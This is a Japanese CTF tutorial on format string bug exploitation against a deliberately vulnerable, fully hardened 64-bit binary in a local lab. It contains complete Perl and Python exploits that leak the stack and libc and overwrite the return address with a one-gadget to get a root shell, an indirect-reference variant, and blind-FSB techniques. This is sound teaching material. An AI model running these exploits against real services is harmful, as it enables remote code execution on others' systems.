# Pwn解説 FSB 3回目 (応用編)

## Pwn出題比率(イメージ)


## 例題

```
フルガード問題

# cat fsb.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

static void show_flag()
{
        char buf[100] = {0};
        int fd = open("./flag", 0);
        read(fd, buf, sizeof(buf)-1);
        printf("Congrats! %s\n", buf);
}

static void vuln(char *str)
{
        printf(str);
        puts("");
}

int main(int argc, char **argv)
{
        char buf[256] = {0};
        char *p;
        setvbuf(stdout, 0, _IONBF, 0);

        while(1) {
                write(1, "Hello! Can you tell me your name?\n", 34);
                if (fgets(buf, sizeof(buf), stdin)) {
                        p = strchr(buf, '\n');
                        if (p) *p = '\0';
                } else {
                        return(EXIT_FAILURE);
                }
                if (strlen(buf)==0) {
                        puts("bye");
                        return(EXIT_FAILURE);
                }
                vuln(buf);
        }
        return 0;
}

コンパイル
# gcc -fPIC -o fsb -Wl,-z,relro,-z,now -pie fsb.c

# pwn.sh fsb
fsb: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=83e7e20e6953dd6d77e2b6928a1bfcc72ad5e16c, not stripped
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY Fortified Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   Yes     0               6       fsb

フラグ生成
# echo FLAG_GGGGGGGGGGGGGGGGGGGGGG > flag
# echo FLAG_ZZZZZZZZZZZZZZZZZZZZZZ > flag2

サーバ起動
# socat TCP-LISTEN:5000,reuseaddr,fork EXEC:./fsb
```

## 解法1 - リターンアドレスの取得・更新で攻略

```
# pwn.sh fsb
fsb: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=944c00fe0e4798cfeb11429e946b6c90261a641f, not stripped
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   77 Symbols     Yes      0               6       fsb

vmmapの結果

gdb-peda$ vmmap
Start              End                Perm      Name
0x0000555555554000 0x0000555555555000 r-xp      /home/guru/work/fsb03/fsb
0x0000555555755000 0x0000555555756000 r--p      /home/guru/work/fsb03/fsb★Full RELRO のためGOTは起動時にアドレス解決されて、ここの末尾に配置される。read onlyとなる
0x0000555555756000 0x0000555555757000 rw-p      /home/guru/work/fsb03/fsb
0x00007ffff7a0f000 0x00007ffff7bcf000 r-xp      /lib/x86_64-linux-gnu/libc-2.21.so
(snip)

スタックの中身を出力して、攻略方針を検討する。

スクリプトの例を以下に記載する。　

$ cat leak.pl
use pwntools;
use Time::HiRes qw (usleep);
# leak stack segment
foreach (1..150) { # 150-300回リークすれば大体argc, argv, envp付近まで到達可能★
  &connect(\$s, 'localhost', 5000) or die "ng";
  &read_until($s, qr/name\?\n/, 10);
  $buf="\%$_\$p"; $buf.="_" x (50-length($buf))."\n";
  syswrite($s, $buf, length($buf));
  $data = &read_until($s, qr/\n/, 10);# print $data;
  $data =~ /(\S+)\_/ && do { printf("%03d: %s\n", $_, $1) ; };
  close($s);
}
__END__

みるべきポイントは？=>リターンアドレス、カナリア値、環境変数、argc/argv、stack（rsp）付近のアドレス、heap付近のアドレス、bss付近のアドレス、libcのアドレス

スタックの配置はローカルもリモートも基本同じ（異なることもあるが、CTFで発生するケースは稀）。相対的にどの位置にどの値がくるか、gdbを使って見比べてみるのがよい

# perl leak.pl
001: 0xa_____________________________________________
002: (nil)_____________________________________________
003: 0xfffc000000000000_____________________________________________
004: 0x7f80fb106033_____________________________________________
005: 0x5f5f5f5f5f5f5f5f_____________________________________________
006: (nil)_____________________________________________
007: 0x7ffe714a29d0_____________________________________________
008: 0x7ffcbd390d30_____________________________________________
009: 0x55edcac01c2c_____________________________________________
010: 0x7ffdc9215948____________________________________________
011: 0x19dabc916____________________________________________
012: (nil)____________________________________________
013: 0x7ffeadd95a92____________________________________________
014: 0x5f5f5f7024343125____________________________________________
015: 0x5f5f5f5f5f5f5f5f____________________________________________
016: 0x5f5f5f5f5f5f5f5f____________________________________________
017: 0x5f5f5f5f5f5f5f5f____________________________________________
018: 0x5f5f5f5f5f5f5f5f____________________________________________
019: 0x5f5f5f5f5f5f5f5f____________________________________________
020: 0x5f5f____________________________________________
021: (nil)____________________________________________
022: (nil)____________________________________________
023: (nil)____________________________________________
(snip)
045: (nil)____________________________________________
046: 0x7ffe523ba480____________________________________________
047: 0xf311b1d12640800____________________________________________★カナリア値
048: 0x5573ffda9c50____________________________________________
049: 0x7efee6eb0a40____________________________________________★リターンアドレス  __libc_start_main+240
050: 0x7ffe24940438____________________________________________
051: 0x7ffc319ee0b8____________________________________________
052: 0x100000001____________________________________________
053: 0x558a9d4fab2c____________________________________________
054: (nil)____________________________________________
055: 0x29f3c6be935b95ab____________________________________________
056: 0x564f2ca9f940____________________________________________
057: 0x7fff7e7f61f0____________________________________________
058: (nil)____________________________________________
059: (nil)____________________________________________
060: 0x5fee4ad861fedeb4____________________________________________
061: 0x7c77536b7dbfb43c____________________________________________
062: (nil)____________________________________________
063: (nil)____________________________________________
064: (nil)____________________________________________
065: 0x7fff644aaa98____________________________________________
066: 0x7fe9ac6a0188____________________________________________
067: 0x7f4182bc86cb____________________________________________
068: (nil)____________________________________________
069: (nil)____________________________________________
070: 0x5598b5c1e940____________________________________________
071: 0x7ffcaf1c3560____________________________________________
072: (nil)____________________________________________
073: 0x5564fe109969____________________________________________
074: 0x7ffd9b4445a8____________________________________________
075: 0x1c____________________________________________
076: 0x1____________________________________________ ★argc
077: 0x7ffe8c8437d7____________________________________________ ★argv
078: (nil)____________________________________________
079: 0x7ffc083537dd____________________________________________ ★envp
080: 0x7ffde84b17f3____________________________________________
081: 0x7ffcc1fb5813____________________________________________

# gdb -q -ex 'b main' -ex r -ex 'telescope $rsp-0x40 0x200' fsb
Breakpoint 1, 0x0000555555554b30 in main ()
0000| 0x7fffffffe510 --> 0x1
0008| 0x7fffffffe518 --> 0x555555554c9d (<__libc_csu_init+77>:  add    rbx,0x1)
0016| 0x7fffffffe520 --> 0xc2
0024| 0x7fffffffe528 --> 0x0
0032| 0x7fffffffe530 --> 0x555555554c50 (<__libc_csu_init>:     push   r15)
0040| 0x7fffffffe538 --> 0x555555554940 (<_start>:      xor    ebp,ebp)
0048| 0x7fffffffe540 --> 0x7fffffffe630 --> 0x1
0056| 0x7fffffffe548 --> 0x0
0064| 0x7fffffffe550 --> 0x555555554c50 (<__libc_csu_init>:     push   r15)
0072| 0x7fffffffe558 --> 0x7ffff7a2fa40 (<__libc_start_main+240>:       mov    edi,eax)
0080| 0x7fffffffe560 --> 0x7fffffffe638 --> 0x7fffffffe83b ("/home/guru/work/fsb03/fsb")
0088| 0x7fffffffe568 --> 0x7fffffffe638 --> 0x7fffffffe83b ("/home/guru/work/fsb03/fsb")
0096| 0x7fffffffe570 --> 0x100000001
0104| 0x7fffffffe578 --> 0x555555554b2c (<main>:        push   rbp)
0112| 0x7fffffffe580 --> 0x0
0120| 0x7fffffffe588 --> 0xc11807441bf8349d
0128| 0x7fffffffe590 --> 0x555555554940 (<_start>:      xor    ebp,ebp)
0136| 0x7fffffffe598 --> 0x7fffffffe630 --> 0x1
0144| 0x7fffffffe5a0 --> 0x0
0152| 0x7fffffffe5a8 --> 0x0
0160| 0x7fffffffe5b0 --> 0x944d52114998349d
0168| 0x7fffffffe5b8 --> 0x944d42ab70a8349d

スタックのリークにより、libc_baseは49番目を使うことで特定可能★=>libc内の関数が利用可能

# ./fsb
Hello! Can you tell me your name?
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.AAAABBBB
0xa.(nil).(nil).0xffff00000000.0x252e70252e70252e.(nil).0x7ffe04211610.0x7ffe04211720.0x5646d3b95c2c.0x7ffe04211808.0x12119c7bc.
(nil).0x7ffe04211660.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x4242424241414141.(nil).AAAABBBB

上記より、バッファ先頭からのオフセット 72、23番目で任意アドレスの参照/更新が可能★

Full RELROであるため、GOTの上書きは不可能★
↓
リターンアドレスの情報が追加で得られると攻略できる★

[攻略方針]
a. スタック上にリターンアドレス特定および上書きで使えるところがないか確認する
b. リターンアドレスに制御をもっていく方法を確認する　★=>ソースコードより、リターンアドレス上書き後、最後に空文字を送ると制御を奪うことができる（ripを指定アドレスにもっていくことができる）

ASLRが無効になる設定のgdbでaを確認していく
ASLRが有効だとプロセス起動の度にアドレス配置が変わるので、解析時は固定の方がよい

bpの仕掛け先を確認する

# gdb -q -ex 'b main' -ex r -ex 'disas vuln' fsb
Breakpoint 1, 0x0000555555554b30 in main ()
Dump of assembler code for function vuln:
   0x0000555555554b01 <+0>:     push   rbp
   0x0000555555554b02 <+1>:     mov    rbp,rsp
   0x0000555555554b05 <+4>:     sub    rsp,0x10
   0x0000555555554b09 <+8>:     mov    QWORD PTR [rbp-0x8],rdi
   0x0000555555554b0d <+12>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000555555554b11 <+16>:    mov    rdi,rax
   0x0000555555554b14 <+19>:    mov    eax,0x0
   0x0000555555554b19 <+24>:    call   0x5555555548c0 <printf@plt>
   0x0000555555554b1e <+29>:    lea    rdi,[rip+0x1c8]        # 0x555555554ced
   0x0000555555554b25 <+36>:    call   0x555555554880 <puts@plt>
   0x0000555555554b2a <+41>:    leave
   0x0000555555554b2b <+42>:    ret　★printf実行後のこの位置にbpを設定して確認してみる
End of assembler dump.

bpまで処理を進めてスタックの配置を確認する

# gdb -q -ex 'b *(vuln+42)' -ex r fsb　★
Reading symbols from fsb...(no debugging symbols found)...done.
Breakpoint 1 at 0xb2b
Starting program: /home/guru/work/fsb03/fsb
Hello! Can you tell me your name?
%p.%p.%p.
0xa.(nil).0xa2e70252e70252e.
(snip)

[-------------------------------------code-------------------------------------]
   0x555555554b1e <vuln+29>:    lea    rdi,[rip+0x1c8]        # 0x555555554ced
   0x555555554b25 <vuln+36>:    call   0x555555554880 <puts@plt>
   0x555555554b2a <vuln+41>:    leave
=> 0x555555554b2b <vuln+42>:    ret

gdb-peda$ telescope $rsp-0x60 0x100
0000| 0x7fffffffe3b8 --> 0x7ffff7a8a4fb (<_IO_new_file_overflow+219>:   cmp    eax,0xffffffff)
0008| 0x7fffffffe3c0 --> 0x0
0016| 0x7fffffffe3c8 --> 0x7ffff7dd4740 --> 0xfbad2887
0024| 0x7fffffffe3d0 --> 0x555555554ced --> 0x6f6c6c6548000000 ('')
0032| 0x7fffffffe3d8 --> 0x7ffff7a7fb9a (<_IO_puts+362>:        cmp    eax,0xffffffff)
0040| 0x7fffffffe3e0 --> 0x0
0048| 0x7fffffffe3e8 --> 0x7fffffffe410 --> 0x7fffffffe550 --> 0x555555554c50 (<__libc_csu_init>:       push   r15)
0056| 0x7fffffffe3f0 --> 0x555555554940 (<_start>:      xor    ebp,ebp)
0064| 0x7fffffffe3f8 --> 0x555555554b2a (<vuln+41>:     leave)
0072| 0x7fffffffe400 --> 0x0
0080| 0x7fffffffe408 --> 0x7fffffffe440 ("%p.%p.%p.")
0088| 0x7fffffffe410 --> 0x7fffffffe550 --> 0x555555554c50 (<__libc_csu_init>:  push   r15) ★リターンアドレス-8のアドレスが格納されている
0096| 0x7fffffffe418 --> 0x555555554c2c (<main+256>:    jmp    0x555555554b8b <main+95>)
0104| 0x7fffffffe420 --> 0x7fffffffe638 --> 0x7fffffffe83b ("/home/guru/work/fsb03/fsb")
0112| 0x7fffffffe428 --> 0x122853cc2
0120| 0x7fffffffe430 --> 0x0
0128| 0x7fffffffe438 --> 0x7fffffffe449 --> 0x0
0136| 0x7fffffffe440 ("%p.%p.%p.")
0144| 0x7fffffffe448 --> 0x2e ('.')
0152| 0x7fffffffe450 --> 0x0
0160| 0x7fffffffe458 --> 0x0
0168| 0x7fffffffe460 --> 0x0
0176| 0x7fffffffe468 --> 0x0
0184| 0x7fffffffe470 --> 0x0
0192| 0x7fffffffe478 --> 0x0
(snip)
--More--(50/256)
0400| 0x7fffffffe548 --> 0x9d6e278fdbbfd00
0408| 0x7fffffffe550 --> 0x555555554c50 (<__libc_csu_init>:     push   r15)
0416| 0x7fffffffe558 --> 0x7ffff7a2fa40 (<__libc_start_main+240>:       mov    edi,eax) ★リターンアドレス0x7fffffffe558 
0424| 0x7fffffffe560 --> 0x7fffffffe638 --> 0x7fffffffe83b ("/home/guru/work/fsb03/fsb")
0432| 0x7fffffffe568 --> 0x7fffffffe638 --> 0x7fffffffe83b ("/home/guru/work/fsb03/fsb")
0440| 0x7fffffffe570 --> 0x100000001
0448| 0x7fffffffe578 --> 0x555555554b2c (<main>:        push   rbp)
0456| 0x7fffffffe580 --> 0x0
0464| 0x7fffffffe588 --> 0xdd2bbb924c5c663
0472| 0x7fffffffe590 --> 0x555555554940 (<_start>:      xor    ebp,ebp)
0480| 0x7fffffffe598 --> 0x7fffffffe630 --> 0x1
0488| 0x7fffffffe5a0 --> 0x0
0496| 0x7fffffffe5a8 --> 0x0
0504| 0x7fffffffe5b0 --> 0x5887eeec76a5c663
0512| 0x7fffffffe5b8 --> 0x5887fe564f95c663

=>ASLR有効でも相対アドレスは変わらないので、リターンアドレス-8のアドレスが格納されている場所をリークすれば攻略可能★

=>スタックをリークした結果と見比べると8番目をリークすればよいと分かる★

=>アドレスの更新は、繰り返し実行可能なので、1バイトずつ書き換えればよい★　＃実際の問題では自力で繰り返し実行に持ち込む必要があるかも


次の流れで攻略する
1. 49番目の値をリークしてlibc_baseを特定する->One Gadget RCEのアドレス特定する (x86-64の場合は引数が必要なsystem関数を呼ぶより、One Gadget RCEを利用した方が楽できることが多い)
2. 8番目の値のリークして+8することでリターンアドレスを得る
3. バッファ先頭からオフセット72の位置にアドレス埋め込みリターンアドレスを上書きする (23番目にリターンアドレスがくるようにして、リターンアドレスを上書する)
4. 空文字送信

__libc_start_main+240のアドレスとOne Gadget RCEのアドレスをgdbなどで出力して差分を確認する。何バイト更新すればよいかを確認する

# grep -A 6 lsm info
$lsm_offset=0x20740;★
$binsh_offset=0x18cd57;
$base_addr=0x7fffebb040;
$system_addr=0x7ffff003d0;
$rce_offset=0x4526a;　★
$rce_offset=0xf02a4;
$rce_offset=0xf1147;

gdb-peda$ p __libc_start_main+240
$1 = (int (*)(int (*)(int, char **, char **), int, char **, int (*)(int, char **, char **), void (*)(void), void (*)(void), void *)) 0x7fcc2f455a40 <__libc_start_main+240>
gdb-peda$ p __libc_start_main-0x20740+0x4526a
$2 = 0x00007fcc2f4792aa
         0x7fcc2f455a40

末尾3バイト更新でOK★

exploit作成

実行

# perl fsb.pl
[+] libc_base = 0x00007f9323a98000
[+] rce_addr = 0x00007f9323b8970d
[+] return_addr = 0x00007ffc1311d698
bye
ok
id
uid=0(root) gid=0(root) groups=0(root)
cat flag2
FLAG_ZZZZZZZZZZZZZ★

■exploit (perl版)

# cat fsb.pl
#!/usr/bin/perl
use pwntools;
use Time::HiRes qw (usleep);

$pwntools::ARCH = '64';
$lsm_offset=0x20950;
#$rce_offset=0x442aa;
#$rce_offset=0xf0840;
$rce_offset=0xf170d;

&connect(\$s, 'localhost', 5000) or die "ng";

## leak lsm
&read_until($s, qr/name\?\n/, 10);
$buf = '%49$p'."\n";
syswrite($s, $buf, length($buf));
$data = &read_until($s, qr/\n/, 10); #print unpack("H*", $data)."\n";
chomp($data);
$libc_base = hex($data)-240-$lsm_offset;
printf("[+] libc_base = 0x%016x\n", $libc_base);
$rce_addr = $libc_base + $rce_offset;
printf("[+] rce_addr = 0x%016x\n", $rce_addr);

# leak return_addr
&read_until($s, qr/name\?\n/, 10);
$buf = '%8$p'."\n";
syswrite($s, $buf, length($buf));
$data = &read_until($s, qr/\n/, 10); #print unpack("H*", $data)."\n";
chomp($data);
$return_addr = hex($data)+8;
printf("[+] return_addr = 0x%016x\n", $return_addr);

# overwrite return_addr to one_gadget_rce_addr
$a=($rce_addr & 0xff); $b=($rce_addr>>8 & 0xff); $c=($rce_addr>>16 & 0xff);
&read_until($s, qr/name\?\n/, 10);
$buf="\%${a}c\%23\$hhn";
$buf.="A" x (72-length($buf)).p($return_addr)."\n";
syswrite($s, $buf, length($buf));
&read_until($s, qr/name\?\n/, 10);
$buf="\%${b}c\%23\$hhn";
$buf.="A" x (72-length($buf)).p($return_addr+1)."\n";
syswrite($s, $buf, length($buf));
&read_until($s, qr/name\?\n/, 10);
$buf="\%${c}c\%23\$hhn";
$buf.="A" x (72-length($buf)).p($return_addr+2)."\n";
#$a = <STDIN>;
syswrite($s, $buf, length($buf));

&read_until($s, qr/name\?\n/, 10);
$buf = "\n"; syswrite($s, $buf, length($buf));
print &read_until($s, qr/\n/, 10); # bye
print "ok\n";
&interact($s);
__END__

■exploit (python版)

$ cat exploit.py
from pwn import *
from libformatstr import FormatStr

#r = process('./fsb')
r = remote('127.0.0.1', 7777)

lsm_offset = 0x20a40 # calculates by gdb.
one_gadget = 0xf170d

# get stack address which has return address.
payload = '%46$p'
r.sendlineafter('Hello! Can you tell me your name?', payload)
r.recvline()
stack_addr = r.recvline()[:-1]
stack_addr = int(stack_addr, 16)
stack_addr = stack_addr - 216
print('stack address which has return address: ' + hex(stack_addr))

# get libc_base address and calculate one_gadget address.
payload = '%49$p'
r.sendlineafter('Hello! Can you tell me your name?', payload)
r.recvline()
lsm_addr = r.recvline()[:-1]
lsm_addr = int(lsm_addr, 16)
libc_base = lsm_addr - lsm_offset
rce_addr = libc_base + one_gadget
print('one_gadget addr : ' + hex(rce_addr))

# generate payload.
fmt = FormatStr(isx64=1)
fmt[stack_addr] = rce_addr
payload = fmt.payload(14)
print('payload :' + payload)

# send payload.
r.sendlineafter('Hello! Can you tell me your name?', payload)

# run shell.
r.sendlineafter('Hello! Can you tell me your name?', 'a'*255)
r.clean()
r.interactive()


fsbの脆弱性がある場合はフルガードでも攻略可能★埋め込まないよう要注意


■別解: リターンアドレスの調べ方

__environを使って辿る方法も、fsbやheap関連の問題で時々使うので覚えておいた方がよい★

例)
# ldd fsb
        linux-vdso.so.1 =>  (0x00007fffd77e9000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd625449000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fd625a16000)
# nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep __environ
00000000003c7218 B __environ★

# gdb -q -ex 'b *(vuln+42)' -ex r fsb
Ctrl-C
gdb-peda$ vmmap
Start              End                Perm      Name
0x0000555555554000 0x0000555555555000 r-xp      /home/guru/work/fsb03/fsb
0x0000555555755000 0x0000555555756000 r--p      /home/guru/work/fsb03/fsb
0x0000555555756000 0x0000555555757000 rw-p      /home/guru/work/fsb03/fsb
0x00007ffff7a0f000 0x00007ffff7bcf000 r-xp      /lib/x86_64-linux-gnu/libc-2.21.so
(snip)
gdb-peda$ p 0x00007ffff7a0f000+0x00000000003c7218
$1 = 0x7ffff7dd6218
gdb-peda$ telescope $1★
0000| 0x7ffff7dd6218 --> 0x7fffffffe648 --> 0x7fffffffe855 ("LESSOPEN=| /usr/bin/lesspipe %s")
0008| 0x7ffff7dd6220 --> 0x0
gdb-peda$ telescope 0x7fffffffe648-0xf0　★x86-64の場合は__environの値から0xf0を引いた先がリターンアドレス
0000| 0x7fffffffe558 --> 0x7ffff7a2fa40 (<__libc_start_main+240>:       mov    edi,eax)★リターンアドレス

```

## 解法2 - 間接参照fsbで攻略

```
例えば、
%p.%p.%p.%p.%p............AAAABBBBを入力しても0x4242424241414141が得られないよう細工されているケースでは間接参照fsbでの攻略を検討する

スタック上にポインタのポインタを見つける(telescopeすると簡単に見つかる)

0144| 0x7fff7903efc8 --> 0x7f6b235f7fc4 (<_IO_fgets+180>:       test   rax,rax)
0152| 0x7fff7903efd0 --> 0x0
0160| 0x7fff7903efd8 --> 0x7fff7903f120 --> 0x55ba769a8c50 (<__libc_csu_init>:  push   r15)　★0x55ba769a8c50は更新できない
0168| 0x7fff7903efe0 --> 0x55ba769a8940 (<_start>:      xor    ebp,ebp)
0176| 0x7fff7903efe8 --> 0x55ba769a8bbf (<main+147>:    test   rax,rax)
0184| 0x7fff7903eff0 --> 0x7fff7903f208 --> 0x7fff790407d7 --> 0x4f48006273662f2e ('./fsb')　★ 10番目 0x7fff790407d7のインクリメントで0x4f48006273662f2eを自由に更新できる
0192| 0x7fff7903eff8 --> 0x100198730
0200| 0x7fff7903f000 --> 0x0
0208| 0x7fff7903f008 --> 0x0
0216| 0x7fff7903f010 ("%92c%23$hhn", 'A' <repeats 61 times>, "*\361\003y\377\177")

1. 10番目のアドレスを使って、上の例の0x7fff790407d7の末尾１バイトを書き変えてインクリメント(例えばc0, c1, c2,...)しつつ、0x7fff790407c0から先の8バイトを任意の値(アドレス)に書き換える
   リターンアドレスなどに書き換える。何回関数呼び出ししても値が変更されない場所を選んで値を埋め込んでいく
2. 更新後にfsbで作成したアドレス0x7fff790407c0を使って任意アドレスの参照および上書きを行う
   gdb-peda$ p/d (0x7fff790407c0-0x7fff7903eff0)/8
   $5 = 765 ★この数字（argv[0]配置先）はプロセス起動の度に変化する。変化しない場所がある場合はそれを利用した方が楽できる
   765+10番目を指定してリターンアドレスを上書きする

exploitの例を以下に記載する

# cat fsb2.pl
#!/usr/bin/perl
use pwntools;
use Time::HiRes qw (usleep);

$pwntools::ARCH = '64';
$lsm_offset=0x20950;
$rce_offset=0xf170d;

&connect(\$s, 'localhost', 5000) or die "ng";

## leak lsm
&read_until($s, qr/name\?\n/, 10);
$buf = '%49$p'."\n";
syswrite($s, $buf, length($buf));
$data = &read_until($s, qr/\n/, 10); #print unpack("H*", $data)."\n";
chomp($data);
$libc_base = hex($data)-240-$lsm_offset;
printf("[+] libc_base = 0x%016x\n", $libc_base);
$rce_addr = $libc_base + $rce_offset;
printf("[+] rce_addr = 0x%016x\n", $rce_addr);

# leak return_addr
&read_until($s, qr/name\?\n/, 10);
$buf = '%8$p'."\n";
syswrite($s, $buf, length($buf));
$data = &read_until($s, qr/\n/, 10); #print unpack("H*", $data)."\n";
chomp($data);
$return_addr = hex($data)+8;
printf("[+] return_addr = 0x%016x\n", $return_addr);

# 間接参照fsb準備
&read_until($s, qr/name\?\n/, 10);
$buf = '%10$s'."\n";
syswrite($s, $buf, length($buf));
$data = &read_until($s, qr/\n/, 10); #print unpack("H*", $data)."\n";
chomp($data);
$n1_addr = u(substr($data, 0, 6)."\x00\x00");
printf("[+] n1_addr = 0x%016x\n", $n1_addr);

$n = ($n1_addr+1-$return_addr)/8+49;
$a=($rce_addr & 0xff); $b=($rce_addr>>8 & 0xff); $c=($rce_addr>>16 & 0xff);
printf("n=%d, a=0x%02x, b=0x%02x, c=0x%02x\n", $n, $a, $b, $c);

# 任意アドレスの生成および更新
@slist = (
        # generate return_addr
        '%'.int(0xc0).'c%10$hhn',
        '%'.int($return_addr&0xff).'c%77$hhn',
        '%'.int(0xc1).'c%10$hhn',
        '%'.int(($return_addr>>8)&0xff).'c%77$hhn',
        '%'.int(0xc2).'c%10$hhn',
        '%'.int(($return_addr>>16)&0xff).'c%77$hhn',
        '%'.int(0xc3).'c%10$hhn',
        '%'.int(($return_addr>>24)&0xff).'c%77$hhn',
        '%'.int(0xc4).'c%10$hhn',
        '%'.int(($return_addr>>32)&0xff).'c%77$hhn',
        '%'.int(0xc5).'c%10$hhn',
        '%'.int(($return_addr>>40)&0xff).'c%77$hhn',
        # overwrite return_addr
        '%'.int($a).'c%'.int($n-3).'$hhn',
        '%'.int(0xc0).'c%10$hhn',
        '%'.int(($return_addr+1)&0xff).'c%77$hhn',
        '%'.int($b).'c%'.int($n-3).'$hhn',
        '%'.int(0xc0).'c%10$hhn',
        '%'.int(($return_addr+2)&0xff).'c%77$hhn',
        '%'.int($c).'c%'.int($n-3).'$hhn',
);
foreach (@slist) {
        &read_until($s, qr/name\?\n/, 10);
        $buf = $_."\n";
        syswrite($s, $buf, length($buf));
}

# invoke shell
&read_until($s, qr/name\?\n/, 10);
$buf = "\n";
#$a = <STDIN>;
syswrite($s, $buf, length($buf));
print &read_until($s, qr/\n/, 10); # bye
print "ok\n";
&interact($s);
__END__

# perl fsb2.pl
[+] libc_base = 0x00007f37290e9000
[+] rce_addr = 0x00007f37291da70d
[+] return_addr = 0x00007ffce3ed5098
[+] n1_addr = 0x00007ffce3ed67d7
n=793, a=0x0d, b=0xa7, c=0x1d
bye
ok
id
uid=0(root) gid=0(root) groups=0(root)
cat flag2
FLAG_ZZZZZZZZZZZZZZZZZZZZZZ★
```

## 過去事例 (+特殊系fsb)

```
Full RELRO
Insomnihack teaser 2017 - baby 50 Full RELRO、socket/bind/listen/accept、fsb、leak canary、bof 難度中
WhiteHat Grand Prix 2017 - Final_countdown 400 Full RELRO、PIE enabled 難度中
HCTF 2017 - guestbook 1000 Full RELRO、PIE enabled、fastbin attack、overwrite __free_hook 難度中
0CTF 2017 Quals - EasiestPrintf 1000 Full RELRO、overwrite __malloc_hook、printfでmallocが呼ばれる条件を探して攻略 難度中
間接参照FSB
PlaidCTF 2015 - EBP 160 難度中
AAAA%p.%p.%p.%p.%p.%pなどを入力しても41414141が出力されないタイプ
picoctf - Format 70 難度低
HITCON CTF 2014 - PYFMT 152　 難度中
%N$のガード有
SECCON 2015オンライン予選 - FSB TreeWalker 200 x86-64 1ビットづつリーク 難度中
IceCTF 2016 - Dear diary 60 "n"は使用不可 難度低
VolgaCTF - Time Is 150 %N$使用不可、カナリア値リーク、bof 難度中
HCTF 2018 - baby printf ver2 1000 FILE Structure Exploitation ('vtable' check bypass)で解くタイプ 難度中
syslog(3)
MMA CTF 1st 2015 - Money Game 200 難度中
環境変数をうまく使ってメモリをリークさせるタイプ
D-CTF Qualification 2015 - That moment 200 難度中
疑似乱数の予測、secret keyの特定、ゲームのクリアなど、fsbの脆弱性に辿り着くまでに幾つかの障害が用意されているタイプ
DEF CON CTF Qualifier 2015 - wibbly wobbly timey wimey 2 難度中
1回の書き込みで8バイト更新
TDUCTF 2015 - Charlotte 200 難度中
HackIM - Exploitation Question 2 300 1回で8バイト更新、libcバージョン特定 難度中
blind fsb
CSA CTF 2019 - Lazy dog 500 x86、__environからリターンアドレス特定 難度中
INShAck 2019 - john-cena 500 x86-64、libcバージョン特定、1バイトずつリーク、__environからリターンアドレス特定 難度中
Can-CWIC CTF - Meta 3 100 31バイト入力制限有、入力回数制限有(1回のみ) blind pwn 難度中
33C3 CTF - ESPR 150 blind fsb、要libc version特定 難度中
SharifCTF - NoMoreBlind 240 blind fsb 難度中
SharifCTF - Guess 50 blind fsb 難度低
SharifCTF - Persian 150 blind fsb 難度中
```

## 参考: blind pwn - fsb

```
解析対象の実行ファイルが提供されないpwn問題。CTFではfsbで攻略するケースが多い

例: 「nc 11.22.33.44 1337」 とだけ問題文に記載されているようなケース

[攻略の流れ]
1. fsbの脆弱性を利用して、スタックをリークしてフラグがでてこないか確認する
   例: SharifCTF - Guess 50
2. fsbの脆弱性を利用して、.dynstrをリークして使われている関数を把握する
   例: CSA CTF 2019 - Lazy dog 500
   # readelf -S speedrun-005 | grep .dynstr
     [ 6] .dynstr           STRTAB           0000000000400398  00000398　★.dynstrは0x400398。ベースアドレス付近に存在する。実戦ではスタックでベースアドレスを特定して上から順にリークしていくとよい
   # gdb -q -ex start -ex 'x/20s 0x400398' -ex q speedrun-005  
   Temporary breakpoint 1, 0x0000000000400590 in ?? ()
   0x400398:       ""
   0x400399:       "libc.so.6"
   0x4003a3:       "puts"　★使われているライブラリ内の関数が分かる
   0x4003a8:       "__stack_chk_fail"
   0x4003b9:       "printf"
   0x4003c0:       "read"
   0x4003c5:       "stdout"
   0x4003cc:       "setvbuf"
   # readelf -r speedrun-005 ★参考: GOTの配置 (.dynstrの配置と異なる順番になるケースもあるので注意)
   (snip)
   再配置セクション '.rela.plt' (オフセット 0x498) は 5 個のエントリから構成されています:
     オフセット      情報           型             シンボル値    シンボル名 + 加数
   000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
   000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
   000000601028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
   000000601030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
   000000601038  000700000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0
3. スタックをリークして攻略に使えそうなアドレスを確認する
4. スタックでlibc_base特定、GOTを参照してlibcバージョン特定、GOT上書で攻略できないか確認する。NGの場合はスタック上のリターンアドレス上書きを狙う
5. 上記で攻略できない場合は、baseアドレスから順番にリークして、結果を逆アセンブルし、動作詳細を把握する。（時間がかかるので、余裕があれば4と並行して実行しておく）
   例: INShAck 2019 - john-cena 500: ★参考: writeup末尾のleak.pl(リンクは過去事例部分↑に記載)。１バイトずつリークしてファイルに保存し、逆アセンブルして動きを確認した
   リークしたデータをobjdumpで逆アセンブルする方法
   x86-64: objdump -m i386:x86-64 -b binary -D out.bin > disas
   x86   : objdump -m i386 -b binary -D out.bin > disas
   -mオプションでCPUアーキテクチャの指定が必要。objdump --helpで指定できる値を確認可能
6. 1-5の情報を見ながら攻略方針を決めて一つ一つ確認する
```

